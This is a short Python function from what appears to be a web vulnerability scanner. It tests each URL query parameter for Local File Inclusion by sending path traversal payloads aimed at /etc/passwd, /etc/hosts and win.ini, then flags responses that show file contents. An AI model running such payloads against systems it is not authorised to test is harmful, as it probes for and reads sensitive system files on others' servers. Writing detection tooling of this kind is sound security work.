import re
from colorama import Fore, Style

def scan(url, session):
    print(f"\n{Fore.MAGENTA}[+] Testing for Local File Inclusion (LFI)...{Fore.RESET}")
    payloads = [
        "../../../../etc/passwd",
        "../../../../etc/hosts",
        "windows/win.ini"
    ]
    vuln_found = False
    
    try:
        if '?' in url:
            base_url, params = url.split('?', 1)
            for param in params.split('&'):
                name, _ = param.split('=', 1) if '=' in param else (param, '')
                for payload in payloads:
                    test_url = f"{base_url}?{name}={payload}"
                    res = session.get(test_url)
                    
                    if "root:x:" in res.text or "[extensions]" in res.text:
                        print(f"{Fore.RED}[!] LFI Vulnerability found at {test_url}")
                        print(f"    Payload: {Style.BRIGHT}{payload}{Style.NORMAL}")
                        vuln_found = True
                        break
    
    except Exception as e:
        print(f"{Fore.YELLOW}[!] LFI Scan Error: {e}{Fore.RESET}")
    
    if not vuln_found:
        print(f"{Fore.GREEN}[✓] No Local File Inclusion vulnerabilities found{Fore.RESET}")
    
    return vuln_found